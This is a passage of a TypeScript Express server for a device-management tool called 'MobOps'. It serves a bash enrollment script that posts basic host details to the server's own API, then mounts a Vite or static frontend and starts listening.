echo "[*] Enrolling Linux Node: $DEVICE_NAME to $SERVER_URL"
curl -s -X POST "$SERVER_URL/api/devices/enroll" \\
  -H "Content-Type: application/json" \\
  -d "{\\"name\\": \\"$DEVICE_NAME\\", \\"model\\": \\"Linux Host\\", \\"os\\": \\"Ubuntu\\", \\"osVersion\\": \\"$(uname -sr)\\", \\"networkType\\": \\"Ethernet\\"}"
echo "[+] Endpoint enrolled! Running background telemetry loop..."
`;
    res.setHeader('Content-Type', 'text/x-shellscript');
    res.setHeader('Content-Disposition', 'attachment; filename="mobops-agent.sh"');
    res.send(agentBash);
  });

  // ==========================================
  // VITE OR STATIC FRONTEND MOUNTING
  // ==========================================
  if (process.env.NODE_ENV === 'production' && fs.existsSync(path.resolve(__dirname, 'dist'))) {
    app.use(express.static(path.resolve(__dirname, 'dist')));
    app.get('*', (req: Request, res: Response) => {
      res.sendFile(path.resolve(__dirname, 'dist', 'index.html'));
    });
  } else {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  }

  app.listen(Number(PORT), '0.0.0.0', () => {
    console.log(`[MobOps Server] Running on http://0.0.0.0:${PORT}`);
    console.log(`[MobOps Server] Ubuntu Auto-Deploy: http://0.0.0.0:${PORT}/api/script/ubuntu-install`);
  });
}

startServer().catch(err => {
  console.error('[MobOps Server] Fatal initialization error:', err);
  process.exit(1);
});
